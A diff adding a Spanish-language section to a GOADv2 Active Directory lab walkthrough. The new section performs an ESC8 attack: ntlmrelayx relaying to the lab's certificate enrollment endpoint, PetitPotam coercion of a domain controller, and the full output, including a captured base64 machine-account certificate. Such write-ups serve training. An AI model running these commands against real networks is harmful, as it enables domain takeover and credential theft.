@@ -40,7 +40,11 @@ Un agradecimiento a [M4yFly](https://twitter.com/M4yFly){:target="_blank"} por c
     1. [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac)
     2. [PrintNightmare Windows Server 2016](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#printnightmare-windows-server-2016)
     3. [PrintNightmare Windows Server 2019](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#printnightmare-windows-server-2019)
-
+9. [ADCS (Active Directory Certificate Services)](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)
+    1. **[ESC8 - coerce to domain admin](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
+    2. **[ESC8 - with certipy](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
+    3. **[ADCS enumeración con certipy y bloodhound](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
+    
 ---
 
 # Recursos Compartidos
@@ -2932,3 +2936,818 @@ SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] To 
 SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] cat /root/.cme/logs/WINTERFELL_winterfell.north.sevenkingdoms.local_2023-08-15_213756.ntds | grep -iv disabled | cut -d ':' -f1
 SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] grep -iv disabled /root/.cme/logs/WINTERFELL_winterfell.north.sevenkingdoms.local_2023-08-15_213756.ntds | cut -d ':' -f1
 ```
+
+
+# **ADCS (Active Directory Certificate Services)**
+
+## **ESC8 - coerce to domain admin**
+
+![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%206.png)
+
+Comprobar si la inscripción por Internet funciona en: [**http://192.168.56.23/certsrv/certfnsh.asp](http://192.168.56.23/certsrv/certfnsh.asp)** y ver que pide autenticación, así que se puede probar el ataque.
+
+![Untitled](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46/Untitled%207.png)
+
+Ponerse a la escucha con ntlmrelay utilizando el comando:`**ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController**`
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+
+[*] Setting up RAW Server on port 6666
+[*] Servers started, waiting for connections
+```
+
+Por otra parte, se ejecuta el [**petitpotam**](https://github.com/topotam/PetitPotam) utilizando el comando: **`PetitPotam.py 192.168.56.104 meereen.essos.local` Una vez completado, se recibe la confirmación "Attack worked!”**
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody]
+└──╼ #PetitPotam.py 192.168.56.104 meereen.essos.local 
+
+                                                                                               
+              ___            _        _      _        ___            _                     
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
+          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
+          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+                                         
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+      
+                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:meereen.essos.local[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+```
+
+Cuando se termina de ejecutar el comando, el ntlmrelay proporciona resultados que incluyen información relacionada con el certificado.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+
+[*] Setting up RAW Server on port 6666
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-5: Received connection from 192.168.56.12, attacking target http://192.168.56.23
+[*] HTTP server returned error code 200, treating as a successful login
+[*] Authenticating against http://192.168.56.23 as ESSOS/MEEREEN$ SUCCEED
+[*] SMBD-Thread-7: Connection from 192.168.56.12 controlled, but there are no more targets left!
+[*] Generating CSR...
+[*] CSR generated!
+[*] Getting certificate...
+[*] GOT CERTIFICATE! ID 5
+[*] Base64 certificate of user MEEREEN$: 
+MIIRbQIBAzCCEScGCSqGSIb3DQEHAaCCERgEghEUMIIREDCCB0cGCSqGSIb3DQEHBqCCBzgwggc0AgEAMIIHLQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIpr6GqdzSqpcCAggAgIIHAO65cZ96NEy+xFEXc2EWyLc+04UoWU/kv+jnXczGfjpKjmcYcDOZ1o3vEy+hSAPidZJs36PPLZbWe/zbyKaFwSF5zKRzm9a2Jbi8K1Q3BRSUAJnmuVV0DdkGaaDgxVbhEyNkRsmxFEyeFGwEgrQ02ZlYy265HOILn50FEFYgzgIzU2VGquyNlgmyBvv6dRFxUUNCIcimSBJJUuD3CslOpRsVRMMyhlSdw4FG0JoyvdT5EGaipA41HW7e/TifIfc+rfz+kxl6zpy2DO/HCI2TSkWvnk3Vl+MunoHrlbmicSILYX3vjf6vxooRy3XMt8XWEKw1+HyyGpuPyTml1q5cgvRk1MEy5X+CKG2ZAP3wrUDb13fFT/S5I0+HCKIciPi3hQFI3jrotZfM4rQ99+IyC4imRRT5giNKkmeXti0wx6oSp1LEU1nM70Inxm0jVgAyq8M9aGPRgg8jbaRkjvmqMQRn5IXcaAr7oY4+XBy4vRaXZN2ygsW37G9ZWzoXCBBmLazFKAWpUyf9eJCHgFLzVe6xEaTQrKvQ3Gc9nk7Abd8byOqy3MaNrYqpebgfx+2p5s5ARQYETYpnUHsFCXkS5wzT9c/tLneDUsywE7uh2mkUUqWWoElTyEBw64QnTUfuGFpVwbFESaaTRhNUf8U586HZjEZW0rNrc4rldF+ONfSSbU0LDDukCjv7mvN01WEffD38Gb2/wH+2pYjFE8zN20M0MrAmVIuQgdj4YveUC6vt4FKVnn0Uk2uAprUz4OBrjpsV5LeN9gX1BJ3D+WIYUxYRY3giTiCT1ul0XKHDFDcX+nSzy2NRowbnWw8EEbeVIlRwUkUKulvucqVDbRQoFpxNWggq76kFUV0cJpeK+whJ8ubuxrTvu7L6NmoCgh5skCc5mwnTe88godUevg90cyBZ80AsrV2R6LGvzfjexd0cJzcdMyckU5i/oPRxW5ZGM12EfIJjwBdNy5mXm/pKIwbYnfRVnfP/qlTkFHyhWtV0Ww0VXoPn1tz4B5H82eW4K+FBV32CNfk27RqayVNiNaPIbZfvtPpACnnLfvYATVjNPKcFPm4HC1w7bMuaXp8yBL1x3rN5kJw9Mut1MepIrkaPMZtmqejVueDts/vRGaYTRlLddHH5FXKVu7HnEN1V3JJn1muTTQNJgDVzT1KylU2tPOIjU00+lirpz282bTmMV7uaYHomIOqXGxUC3tHMA8pYN24vdg8usBRztJxHkDoAu4M/FE5nWwhEKoVAHOkWiOCbZr0URwCdkE09n0v6BViYOmCODefZ2DjsZ9ng+ccZDNmNNtf0QxrLELzwpUQ0Pn1+nqI5TFbonuPiCCLs/+PEQQbweB9BKAlYd2ZiRzo3yB9twNv6LgRHRC5T5ZhvCUWkPx6ddvX1OiE8Atr+AMlNl5Fa6Xpl0WII4wDjSunqChnsL0kWvOVEpDTXgtODN488lUBuyvYN13j30iHhFDbNveDdt4fAmggpgO6Jjdr1g01/fP7Q8dtFrQrsYdAGCOvHV/n/xcANs8eJh8itPya3S129SmfCYhvsvbWC9XOcEKHf0ez6FeZZvbE5oYTunP1jk6oqQY1toFejRgt3n7+8ElsalSfwmw52jmCRtPYENPtg9lY3scKxBAjKP4LD/S5qqO2fLKLN/VwYijpfDa+FQ7MgTuJSwsJV7/1XxfFfnN83uGQSb0pWR1CivaQ1DNf25ywuARnYEQEZ0BQtPFCLfnXLfExmCeEt/dmR2Ti0hq5rIyFJDgB/YCpITjfA5TkxV4TlF1QrGYanMH+xeZ+hedXdmXD/aq9gD1/aHn28ezNb5OUWKbuDj0gJoREaimO3ghR8EcUGhC+Qm+3KIC4f+j/tmbqMHngCMey2tQKdCN1JAhAoPB+G/ewKS7+xAl3y9GxNarRFgl1BAFpw9BJ9jjcJ9vsqJPN6mQ0wuVMf/Cb3RblH2SA8XRq+abCHKxBfodkg94/Xe191KnidHLOAbBTCAC9v0weLKg529vPeaNYQzzauFDToo6MZgDjtQXfvllpnYxkJdhVkB6MXwGPId7lkcidVJlH8lUU1SaHB3aB4uUenyIGSuhfxto0/umcsJITEJrE4BiwHV0DO5WExpIIsCr/J9njMs+WO5PQK7c/YU5As+DT1K7AZpOAkSvhjBfA0xIc1Xz87SFfkHS4yWIrhverBsrutvVt5AOicKBzoK3+/X1jrkMBTu7cwVDzLtA4DBfxaAAc/ustYY17G2neSidTti38C2yuEnzKdud6EYT6x+Lry7BAaoXT+sK+fJ/WWVhifKcPJUrl03KE2WzguSlsGm/t6Wri6vQ75HdamU6b6SYgB9bMH+pOmJXWn6Hoi4poDqL5pvsvhxvP1uHudHi7bXmLO34ymMa4wggnBBgkqhkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQEMAQMwDgQI7Sbihewo3kECAggABIIJSJbbuHc9joPjcJSikRnFda8nAS0sPwsN3+ql+QTRDaZI/AglQSVg8ZVQgzDkF3qxPvwjcTKIp+8Pc6ATTHq4/azC7u4SYoFx4NQ1tIHLPp1k6Jg/GHj0snc+/Q0Yb9TttcVe9mq7rMWYVjrl9o1Eh6G5st3vrSaNzkvLxOHVHpT2oig/7zh6sgkM54tF0M/rGr0OmQs1SdwN3Gji/CnH5QVTdzAs3J0K7g71ua7UxsdQtgyM8NfdquQWNCrizHl+Lw6kS8sMg95wA4+s0A8Y8Mz3fdG6Rg5bb3LIP2Dz0oWkj+DY5eof06OVWN0ZcHwQvys30LkgmoUODvqRdxiia8J8gBbSrQfiKl7K54tdYhjAMgkT5vz51tVQCPN79XLOZSVvDpA5jGQk170GmTgyjyni0L6bMcr+Bvr+voSScBhvxNfbM0mvFCzf4kVlVTOd0fEh4zTXHXiFb680PhaEgYy4ChIp5WnBcosH42CViRZGF3EbUFS2JgEtZETZgU3mVG3BnOmNLRLbCvf/UPnn+Oe7t00L0ggJj28ki2+jFRhAODnQDaLMTuGsm/DG9EUAsTFyTnE98YLg2S4u0J9QM0VettO6dzNLDai+X/pFiBhXwcM5GcXBa+K5S/QGAOmL0cfKQqgAetMpP17IQgvN8+bekRrtIIjELMU6Xqg3RVNXabM5iW/kYkNqLr0/hEQ72NMEe3BObKfn655hS2ujmMpUn0qpWwfbrFXFMrl1qACtDuextThFZKGbfVXCj1SaEl4j2NA/hna5ELGP1rF+glEQHXTtfgNPQ/2txlfAqz/McKYrCCiFMpOJ4+b/hdXvLGMufRX9Yv04LtFO6bwfZY04k+VCiRg4HKJYZivgdoAgWMo9xqtg7j6oLwEPkMIOGgHIzd7No84vF9UIrxNVvk3/nl14xHlPz9uyFvK+xNVLT1T2HC7MjfvQm0C4eLKdUierAYeinYpocPMPsHvYUrkrHxhmrDBw3qUdTYpKIyX1B+psYT/1aI1ucruxCAKpOd4l9gnXrsheY9kAWgbstvh9H93jhT8ZhAKLyK2NWEZQ4OpTKyJtn5xCVWUBtRKmSfVZyjSku9DAkz/ig49cuZn3J3W6WxzyOfHRJvV0hYX+xahb7bGBCT1WDTgO1tMYQMQOSHG8Lgrr3bnmPg5W3RTQL5LwKkKob2Jo7hrlq6xTZPCCq1TNU408Ayx6QVqeCHvsf3U1KjZPSw1ZretUz/kg2YKA3e35BjaQ/zWJmZyWLQszQBOepoLkh0RTbtGKGNbVKsiGZbqTnl3F/ZTPAc+C7xvDqKFcsoMiRlKpUAVUzgcKXwikCqk4b5vhQB/zKv1T0E7s5mnKNjQIWdW5EsUVg2ylPdZhDK8gR0vr7Zj/0UGRv+4h0h16VFVNRYxR0nTMG6l5kf1BgWluhaA+8f+a+AVC6QXrsFDOXIyvQ0eFJefqMqiYjP/HQvy6Eep/l6CGFHGDvjPR3FDy7u9zdEBY3BDKWtHZ51MgQf1ecs5fzcbs5c0o7eBwuiXytx4mH5xUeo30+zQq+w9ebAWeVl3xUWBCm7/JjWUFeSQXA+1RKxfEw8IeS+IMrNmljkPhSe4R+4sUDFv4BZ/UzsD9Di8W06JZMOFYOl93gUME92yFp36wiXswxS9wqtKxXGNSH77GiP46fBfdSbV8a8yCk65RlCr03K60xWWrNCnMLkdV1CLWuBZikpkS5FkGGr+GgV2j1xbxwr7adVrCY8oDYsGTcb5o8TZ+9dTmzIVATyDD/JRfYS+8g1ByUHsQRp22Wh2bDvr8LKOIhf21AuXpcAkfUHPc9pjFrPHyM20ReWWy3s44HAQRWB0/6XGKorerwesZcyX5KiBNExBQ2OCnz4wGFR8DBvjvtDPFbG8corC9z6wlpBp9Ej9rKcWShbWx7X5ARFApGG9V8oq632+GZYlVWp+r20FiyomafOKxlZPEx82eav9jF7MgMyP+2r+CoQIiKQQk5yvyHX1k8Vr/HnBEq/bH43/FpTcZGzNh7vdot1/hRF3KqHjk0Rlq3PY1dwA0fv+HEPZNbd/N8jUat2frpc8fFSnpBLm8p7FDGhI8Yns7dMiAirQRNaZ7RlexUfSIWvpOJyd2Ac+fxiwWrvWzKbRCSNJ1/cHlOpBADoovx0TJkYOCm/1lQFKpteabn/h00OCDtTnOx2qdSXY7+OKJKFfqkShneqVB8sZKkQTEwMpdR7Jql0/P8EpMxa9SKog1f63IlhYsUceGlc4Lg2VekfIACzvGs3uJfnqk0TeCI49eutKCEtlDpGnHqbEuhnM6RyJpqco0fHROrf/KQXwRnJMPv6v0clSf5IqF9zods+u9cK0cEsjW3uWw2whCE5Fmir1ixw65rtbSk25Fugqy4fo9OpwOgOmz9IBUxBoKnfOB4vtMG2h4LnufoTO+RF17RPA+U6Dk5E3cilw6dq9OchsiSgZyjRB7qvxmEZPe2T7Y4ygaLNy4FcJ5xLvBhMzvWuKKU3y5Y652jy/67w1q1Kiw6LSlZYNFZ9Ez3SymQYKbwmhDTGPVx0DjyFt3jbX0oFKJrK3WwlQ14BDlCCeRvV+V2QvWKV3hWBpJFYjALw8mQDadur82Qimm5pZ1quHC8iLvBg8o/8QxeL8f5r5cjH7GLf9CuLbZQxf5TojMBe1E5Sz+gSM80ko1f59Yd0mng8S1C08M1QUtqGtKMMtxwulrzqqwRxdSY8heJufKV7HaD1xsJiPLUOzB4XgxwAGdPh5FP1xKkoVfuySQY1iXUGs1+k4rhjS4ejDYyHwrNzMcHAA5YCRT9qd/4zvbT6htjPaVo4k69NP6syvIQFP+u8v830D9vsJaBlepMkFpeqjFmpvl+lnYRP14hea7aW7xEQzeGYio0QSA6q6nCVOGt7dsoRxZHv6C7i+fCGEIus/vUXcAYXD2qt66TjQsRAxqcrXW2vS8m31Z4MZBuiWarUSrTF9kAMbIZ8WEIHQC/OOnaSL7aN3qYDVcdlpVmT1CTcJAzvDvvxGRAo+LxLFg58iFGZ9Zwgl/Z1DHrPK2eQoKWnu/lfchF315+RA+LCC/u3jYP0mcLoKpWar6DZb+/4BsEIWy11nKHgT+LE66lt93mFJDGZsGKHEQSz89dC9JDpPU20ZtaswsiDMGFAwFEneNPYKj0TElMCMGCSqGSIb3DQEJFTEWBBRcgmwuNIzqAXVdafpRRSusQInVxTA9MDEwDQYJYIZIAWUDBAIBBQAEIKZhAhwUwC8nUM2phrFGdV2TS61zBME7znvdJ31ehKsbBAhSpV+63wLLCQ==
+```
+
+En este punto, se procede a guardar el certificado en un archivo que puede nombrarse "cert.b64" u otro nombre de preferencia.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #cat cert.b64 
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: cert.b64
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ MIIRbQIBAzCCEScGCSqGSIb3DQEHAaCCERgEghEUMIIREDCCB0cGCSqGSIb3DQEHBqCCBzgwggc0AgEAMIIHLQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIpr6GqdzSqpcCAggAgIIHAO65cZ96NE
+       │ y+xFEXc2EWyLc+04UoWU/kv+jnXczGfjpKjmcYcDOZ1o3vEy+hSAPidZJs36PPLZbWe/zbyKaFwSF5zKRzm9a2Jbi8K1Q3BRSUAJnmuVV0DdkGaaDgxVbhEyNkRsmxFEyeFGwEgrQ02ZlYy265HOILn50F
+       │ EFYgzgIzU2VGquyNlgmyBvv6dRFxUUNCIcimSBJJUuD3CslOpRsVRMMyhlSdw4FG0JoyvdT5EGaipA41HW7e/TifIfc+rfz+kxl6zpy2DO/HCI2TSkWvnk3Vl+MunoHrlbmicSILYX3vjf6vxooRy3XMt8
+       │ XWEKw1+HyyGpuPyTml1q5cgvRk1MEy5X+CKG2ZAP3wrUDb13fFT/S5I0+HCKIciPi3hQFI3jrotZfM4rQ99+IyC4imRRT5giNKkmeXti0wx6oSp1LEU1nM70Inxm0jVgAyq8M9aGPRgg8jbaRkjvmqMQRn
+       │ 5IXcaAr7oY4+XBy4vRaXZN2ygsW37G9ZWzoXCBBmLazFKAWpUyf9eJCHgFLzVe6xEaTQrKvQ3Gc9nk7Abd8byOqy3MaNrYqpebgfx+2p5s5ARQYETYpnUHsFCXkS5wzT9c/tLneDUsywE7uh2mkUUqWWoE
+       │ lTyEBw64QnTUfuGFpVwbFESaaTRhNUf8U586HZjEZW0rNrc4rldF+ONfSSbU0LDDukCjv7mvN01WEffD38Gb2/wH+2pYjFE8zN20M0MrAmVIuQgdj4YveUC6vt4FKVnn0Uk2uAprUz4OBrjpsV5LeN9gX1
+       │ BJ3D+WIYUxYRY3giTiCT1ul0XKHDFDcX+nSzy2NRowbnWw8EEbeVIlRwUkUKulvucqVDbRQoFpxNWggq76kFUV0cJpeK+whJ8ubuxrTvu7L6NmoCgh5skCc5mwnTe88godUevg90cyBZ80AsrV2R6LGvzf
+       │ jexd0cJzcdMyckU5i/oPRxW5ZGM12EfIJjwBdNy5mXm/pKIwbYnfRVnfP/qlTkFHyhWtV0Ww0VXoPn1tz4B5H82eW4K+FBV32CNfk27RqayVNiNaPIbZfvtPpACnnLfvYATVjNPKcFPm4HC1w7bMuaXp8y
+       │ BL1x3rN5kJw9Mut1MepIrkaPMZtmqejVueDts/vRGaYTRlLddHH5FXKVu7HnEN1V3JJn1muTTQNJgDVzT1KylU2tPOIjU00+lirpz282bTmMV7uaYHomIOqXGxUC3tHMA8pYN24vdg8usBRztJxHkDoAu4
+       │ M/FE5nWwhEKoVAHOkWiOCbZr0URwCdkE09n0v6BViYOmCODefZ2DjsZ9ng+ccZDNmNNtf0QxrLELzwpUQ0Pn1+nqI5TFbonuPiCCLs/+PEQQbweB9BKAlYd2ZiRzo3yB9twNv6LgRHRC5T5ZhvCUWkPx6d
+       │ dvX1OiE8Atr+AMlNl5Fa6Xpl0WII4wDjSunqChnsL0kWvOVEpDTXgtODN488lUBuyvYN13j30iHhFDbNveDdt4fAmggpgO6Jjdr1g01/fP7Q8dtFrQrsYdAGCOvHV/n/xcANs8eJh8itPya3S129SmfCYh
+       │ vsvbWC9XOcEKHf0ez6FeZZvbE5oYTunP1jk6oqQY1toFejRgt3n7+8ElsalSfwmw52jmCRtPYENPtg9lY3scKxBAjKP4LD/S5qqO2fLKLN/VwYijpfDa+FQ7MgTuJSwsJV7/1XxfFfnN83uGQSb0pWR1Ci
+       │ vaQ1DNf25ywuARnYEQEZ0BQtPFCLfnXLfExmCeEt/dmR2Ti0hq5rIyFJDgB/YCpITjfA5TkxV4TlF1QrGYanMH+xeZ+hedXdmXD/aq9gD1/aHn28ezNb5OUWKbuDj0gJoREaimO3ghR8EcUGhC+Qm+3KIC
+       │ 4f+j/tmbqMHngCMey2tQKdCN1JAhAoPB+G/ewKS7+xAl3y9GxNarRFgl1BAFpw9BJ9jjcJ9vsqJPN6mQ0wuVMf/Cb3RblH2SA8XRq+abCHKxBfodkg94/Xe191KnidHLOAbBTCAC9v0weLKg529vPeaNYQ
+       │ zzauFDToo6MZgDjtQXfvllpnYxkJdhVkB6MXwGPId7lkcidVJlH8lUU1SaHB3aB4uUenyIGSuhfxto0/umcsJITEJrE4BiwHV0DO5WExpIIsCr/J9njMs+WO5PQK7c/YU5As+DT1K7AZpOAkSvhjBfA0xI
+       │ c1Xz87SFfkHS4yWIrhverBsrutvVt5AOicKBzoK3+/X1jrkMBTu7cwVDzLtA4DBfxaAAc/ustYY17G2neSidTti38C2yuEnzKdud6EYT6x+Lry7BAaoXT+sK+fJ/WWVhifKcPJUrl03KE2WzguSlsGm/t6
+       │ Wri6vQ75HdamU6b6SYgB9bMH+pOmJXWn6Hoi4poDqL5pvsvhxvP1uHudHi7bXmLO34ymMa4wggnBBgkqhkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQ
+       │ EMAQMwDgQI7Sbihewo3kECAggABIIJSJbbuHc9joPjcJSikRnFda8nAS0sPwsN3+ql+QTRDaZI/AglQSVg8ZVQgzDkF3qxPvwjcTKIp+8Pc6ATTHq4/azC7u4SYoFx4NQ1tIHLPp1k6Jg/GHj0snc+/Q0Y
+       │ b9TttcVe9mq7rMWYVjrl9o1Eh6G5st3vrSaNzkvLxOHVHpT2oig/7zh6sgkM54tF0M/rGr0OmQs1SdwN3Gji/CnH5QVTdzAs3J0K7g71ua7UxsdQtgyM8NfdquQWNCrizHl+Lw6kS8sMg95wA4+s0A8Y8M
+       │ z3fdG6Rg5bb3LIP2Dz0oWkj+DY5eof06OVWN0ZcHwQvys30LkgmoUODvqRdxiia8J8gBbSrQfiKl7K54tdYhjAMgkT5vz51tVQCPN79XLOZSVvDpA5jGQk170GmTgyjyni0L6bMcr+Bvr+voSScBhvxNfb
+       │ M0mvFCzf4kVlVTOd0fEh4zTXHXiFb680PhaEgYy4ChIp5WnBcosH42CViRZGF3EbUFS2JgEtZETZgU3mVG3BnOmNLRLbCvf/UPnn+Oe7t00L0ggJj28ki2+jFRhAODnQDaLMTuGsm/DG9EUAsTFyTnE98Y
+       │ Lg2S4u0J9QM0VettO6dzNLDai+X/pFiBhXwcM5GcXBa+K5S/QGAOmL0cfKQqgAetMpP17IQgvN8+bekRrtIIjELMU6Xqg3RVNXabM5iW/kYkNqLr0/hEQ72NMEe3BObKfn655hS2ujmMpUn0qpWwfbrFXF
+       │ Mrl1qACtDuextThFZKGbfVXCj1SaEl4j2NA/hna5ELGP1rF+glEQHXTtfgNPQ/2txlfAqz/McKYrCCiFMpOJ4+b/hdXvLGMufRX9Yv04LtFO6bwfZY04k+VCiRg4HKJYZivgdoAgWMo9xqtg7j6oLwEPkM
+       │ IOGgHIzd7No84vF9UIrxNVvk3/nl14xHlPz9uyFvK+xNVLT1T2HC7MjfvQm0C4eLKdUierAYeinYpocPMPsHvYUrkrHxhmrDBw3qUdTYpKIyX1B+psYT/1aI1ucruxCAKpOd4l9gnXrsheY9kAWgbstvh9
+       │ H93jhT8ZhAKLyK2NWEZQ4OpTKyJtn5xCVWUBtRKmSfVZyjSku9DAkz/ig49cuZn3J3W6WxzyOfHRJvV0hYX+xahb7bGBCT1WDTgO1tMYQMQOSHG8Lgrr3bnmPg5W3RTQL5LwKkKob2Jo7hrlq6xTZPCCq1
+       │ TNU408Ayx6QVqeCHvsf3U1KjZPSw1ZretUz/kg2YKA3e35BjaQ/zWJmZyWLQszQBOepoLkh0RTbtGKGNbVKsiGZbqTnl3F/ZTPAc+C7xvDqKFcsoMiRlKpUAVUzgcKXwikCqk4b5vhQB/zKv1T0E7s5mnK
+       │ NjQIWdW5EsUVg2ylPdZhDK8gR0vr7Zj/0UGRv+4h0h16VFVNRYxR0nTMG6l5kf1BgWluhaA+8f+a+AVC6QXrsFDOXIyvQ0eFJefqMqiYjP/HQvy6Eep/l6CGFHGDvjPR3FDy7u9zdEBY3BDKWtHZ51MgQf
+       │ 1ecs5fzcbs5c0o7eBwuiXytx4mH5xUeo30+zQq+w9ebAWeVl3xUWBCm7/JjWUFeSQXA+1RKxfEw8IeS+IMrNmljkPhSe4R+4sUDFv4BZ/UzsD9Di8W06JZMOFYOl93gUME92yFp36wiXswxS9wqtKxXGNS
+       │ H77GiP46fBfdSbV8a8yCk65RlCr03K60xWWrNCnMLkdV1CLWuBZikpkS5FkGGr+GgV2j1xbxwr7adVrCY8oDYsGTcb5o8TZ+9dTmzIVATyDD/JRfYS+8g1ByUHsQRp22Wh2bDvr8LKOIhf21AuXpcAkfUH
+       │ Pc9pjFrPHyM20ReWWy3s44HAQRWB0/6XGKorerwesZcyX5KiBNExBQ2OCnz4wGFR8DBvjvtDPFbG8corC9z6wlpBp9Ej9rKcWShbWx7X5ARFApGG9V8oq632+GZYlVWp+r20FiyomafOKxlZPEx82eav9j
+       │ F7MgMyP+2r+CoQIiKQQk5yvyHX1k8Vr/HnBEq/bH43/FpTcZGzNh7vdot1/hRF3KqHjk0Rlq3PY1dwA0fv+HEPZNbd/N8jUat2frpc8fFSnpBLm8p7FDGhI8Yns7dMiAirQRNaZ7RlexUfSIWvpOJyd2Ac
+       │ +fxiwWrvWzKbRCSNJ1/cHlOpBADoovx0TJkYOCm/1lQFKpteabn/h00OCDtTnOx2qdSXY7+OKJKFfqkShneqVB8sZKkQTEwMpdR7Jql0/P8EpMxa9SKog1f63IlhYsUceGlc4Lg2VekfIACzvGs3uJfnqk
+       │ 0TeCI49eutKCEtlDpGnHqbEuhnM6RyJpqco0fHROrf/KQXwRnJMPv6v0clSf5IqF9zods+u9cK0cEsjW3uWw2whCE5Fmir1ixw65rtbSk25Fugqy4fo9OpwOgOmz9IBUxBoKnfOB4vtMG2h4LnufoTO+RF
+       │ 17RPA+U6Dk5E3cilw6dq9OchsiSgZyjRB7qvxmEZPe2T7Y4ygaLNy4FcJ5xLvBhMzvWuKKU3y5Y652jy/67w1q1Kiw6LSlZYNFZ9Ez3SymQYKbwmhDTGPVx0DjyFt3jbX0oFKJrK3WwlQ14BDlCCeRvV+V
+       │ 2QvWKV3hWBpJFYjALw8mQDadur82Qimm5pZ1quHC8iLvBg8o/8QxeL8f5r5cjH7GLf9CuLbZQxf5TojMBe1E5Sz+gSM80ko1f59Yd0mng8S1C08M1QUtqGtKMMtxwulrzqqwRxdSY8heJufKV7HaD1xsJi
+       │ PLUOzB4XgxwAGdPh5FP1xKkoVfuySQY1iXUGs1+k4rhjS4ejDYyHwrNzMcHAA5YCRT9qd/4zvbT6htjPaVo4k69NP6syvIQFP+u8v830D9vsJaBlepMkFpeqjFmpvl+lnYRP14hea7aW7xEQzeGYio0QSA
+       │ 6q6nCVOGt7dsoRxZHv6C7i+fCGEIus/vUXcAYXD2qt66TjQsRAxqcrXW2vS8m31Z4MZBuiWarUSrTF9kAMbIZ8WEIHQC/OOnaSL7aN3qYDVcdlpVmT1CTcJAzvDvvxGRAo+LxLFg58iFGZ9Zwgl/Z1DHrP
+       │ K2eQoKWnu/lfchF315+RA+LCC/u3jYP0mcLoKpWar6DZb+/4BsEIWy11nKHgT+LE66lt93mFJDGZsGKHEQSz89dC9JDpPU20ZtaswsiDMGFAwFEneNPYKj0TElMCMGCSqGSIb3DQEJFTEWBBRcgmwuNIzq
+       │ AXVdafpRRSusQInVxTA9MDEwDQYJYIZIAWUDBAIBBQAEIKZhAhwUwC8nUM2phrFGdV2TS61zBME7znvdJ31ehKsbBAhSpV+63wLLCQ==
